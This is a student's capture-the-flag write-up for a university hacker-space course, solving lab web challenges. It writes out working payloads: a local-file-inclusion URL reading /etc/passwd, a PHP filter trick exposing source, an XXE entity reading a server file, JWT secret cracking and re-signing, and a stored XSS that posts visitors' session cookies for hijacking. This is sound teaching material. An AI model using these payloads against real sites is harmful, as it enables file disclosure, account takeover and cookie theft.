# Exercise 2 (Lecture 2)

Exercises using Haaukins for the Hacker space course in the spring semester 2024.

## Admin logon

**Challenge Description**: Menne company at menne.com is hiding things from all of its users. Can you login as admin and find out what they want to keep secret? It doesn’t seem to check anyone’s password.

### Challenge Solution
This was a simple cookie manipulation challenge, which was solved by chaning `{admin: False}` to `{admin: True}` in the cookie and reloading the site.

## JWT

**Challenge Description**: Visit jwt.com. What is that cookie after you have logged in? Have you ever heard of JWT?

### Challenge Solution
This challenge supplied a JWT, which had a simple secret set. In order to crack the secret, John the ripper was used. The secret was `challenge`. Using the JWT.com jwt parser to change the user to admin and resigning the cookie with the correct secret, this challenge was solved.

## Serilizator

**Challenge Description**: Visit serializator.com. Login as Admin to reach the goal!

### Challenge Solution

Revisit.

## Challenge: Exploracaõ

**Challenge Description**:  Mom, can we have geoguessr? No we have geoguessr at home: i3geo

### Challenge solution

Seemingly no exploit on the loging page or by manipulating the cookies. However a Local file inclusion (LFI). Where the attacker can print out arbitrary files on the filesystem using the URL. `http://exploracao.hkn/i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd` this URL will print the passwd file of the server. The page `http://exploracao.hkn/i3geo/flag.php` shows that the flag is only visible to admin user, so we either need to find the flag file or find the admin user credentials.

PHP code is evaluated and sends a rendered HTML file to the user if we try to get it through the URL with LFI. Therefore we are able to craft a URL `http://exploracao.hkn/i3geo/exemplos/codemirror.php?&pagina=php://filter/convert.base64-encode/resource=../flag.php` which uses PHP filters to encode the file to base64 before returning the output to the browser. This way the PHP code is not excecuted. The very interesting part is the filters applied: `php://filter/convert.base64-encode/resource=../flag.php`. Pasting the result into cyberchef gives the original output:

```php
<?php
define("ONDEI3GEO", ".");
include "ms_configura.php";
include "./init/head.php";
?>

<body style="padding-top: 90px;" id="topo">
    <nav class="navbar navbar-default navbar-fixed-top">
        <div class="container-fluid">
            <div class="navbar-header">
                <button type="button" title="icon-bar" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                    <span class="sr-only"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" onclick="$('.cartao').fadeIn(600);" href="./init/index.php">
                    <span class="material-icons md-18">home</span> <?php echo $mensagemInicia;?>
                </a>
            </div>
            <div id="navbar" class="navbar-collapse collapse navbar-responsive-collapse">

            </div>
        </div>
    </nav>

    <!-- FLAG -->
    <div class="container-fluid row center-block;" style="width:100%" id="conteudoPrincipal" tabindex="-1">
        <div class="row center-block text-center" style="max-width:1000px">
            <?php
            if ($_SESSION["usuario"] === "administrador") {
                echo "<h2>DDC{Static_Flag_redacted}</h2>";
            } else {
                echo "<h2>Flag is only visible to admin user</h2>";
            }
            ?>
        </div>
    </div>

    <div tabindex="-1" class="navbar-fixed-bottom container-fluid" style="background-color: #fff; margin-top: 10px; padding-top: 10px;">
        <div class="row text-center">
            <div class="col-lg-12 center-block">
                <a tabindex="-1" rel="license" href="http://creativecommons.org/licenses/GPL/2.0/legalcode.pt" target="_blank">
                    <img alt="Licen&ccedil;a Creative Commons" style="border-width: 0" src="https://i.creativecommons.org/l/GPL/2.0/88x62.png" />
                </a>
                <br />O i3Geo est&aacute; licenciado com uma Licen&ccedil;a
                <a tabindex="-1" rel="license" href="http://creativecommons.org/licenses/GPL/2.0/legalcode.pt" target="_blank">Creative Commons - Licen&ccedil;a P&uacute;blica
                    Geral GNU (&#34;GNU General Public License&#34;)</a>
            </div>
        </div>
    </div>
</body>
</html>
```

Giving us the flag in the if statement. Original flag redacted, as it is static.

## External entities

**Challenge Description**: If a JSON string looks this `{“login”:{“user”:“username”,“pass”:“password”}}`… Then what would the same string look like in XML? Use the XML format of the string as a request to a webserver at external.com. Manipulate it to print the flag.txt file located in the /home/ directory.

### Challenge Solution

This challenge is about XML External Entity injection. This kind of attack happens when an attacker has control over the XML which is parsed by a webserver, XML entities are variables in XML. The service on `external.com` uses a specific format of XML for logging in a user. The format is the XML equivalent of the JSON from the Challenge description: `<login><user>username</user><pass>password</pass></login>`. In reality this webserver just informs the user which username has been parsed in the `<user>` tag of the xml. This is seen in the respone: 

```html
<pre>You have logged in to the server as username</pre>
```

This means that we can use XML entities to write out the contents of the file system through this username attribute. The payload looks like this: 

```xml
<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///home/flag.txt'> ]>
<login>
<user>hej&xxe;</user>
<pass>pass</pass>
</login>
```

Here the Document type definition is used to load the contents of the flag.txt into the `xxe` variable, and then this variable is supplied to the user tag, where it will be printed to the browser. The response will be:

```html
<pre>You have logged in to the server as hej
HKN{R2-Njh-o2JCW}
</pre>
```

And there the flag is located!

**Note:** Using curl, it is possible to parse a file as the data by using `-d @file-path` as a param.

## Sharing is caring

**Challenge Description**: Across the site `https://dogshare.com`, alot of delicious hotdogs has been shared. Maybe you can make the users visiting the site share a little extra?

### Challenge Solution

The website hosted on `https://dogshare.com` is a blog where users can share pictures of hotdogs. No user is supplied, yet even without one, it is possible to comment on the posts. This might be an XSS challenge. We are able to achieve stored XSS by posting a comment with the payload: `<img src='#' onerror=alert(1) />`. It seems like some tags are sanitized and others are not, like the image tag.

After achieving XSS we need to modify the payload of the stored XSS, to post the cookie of the other users. This is done by changing the code in the onerror part of the img tag to the following:

`fetch("/comments", {method: "POST", headers: {'Content-Type': 'application/x-www-form-urlencoded'},body: "did=1&comment=" + btoa(document.cookie)})`

Here the fetch JS function is used to post a comment to the dogshare website, including the document.cookie (a users cookie) encoded as base64. The `did=1` part of the form, is specifying which post to comment on.

**Note**: Payload needs to be URL encoded in order to parse correctly.

```urlencode
did=1&comment=test+<img+src%3d'%23'+onerror%3d"fetch('/comments',+{method%3a+'POST',+headers%3a+{'Content-Type'%3a+'application/x-www-form-urlencoded'},+body%3a+'did%3d1%26comment%3d'+%2b+btoa(document.cookie)})"+/>
```

When the comment is registered and other user visit the a comment is posted with their session cookie: `c2Vzc2lvbj03YjNmMjNmNzVhOGU1ZTdhYTU4YjgwOTJmMjVhOTFkNQ` encoded as base64. The cookie is decoded and parsed into the browser as: `session=7b3f23f75a8e5e7aa58b8092f25a91d5`. When reloading the site, we are logged in as Kristy.

Found flag!: HKN{MP-3G-Oxo4kC}
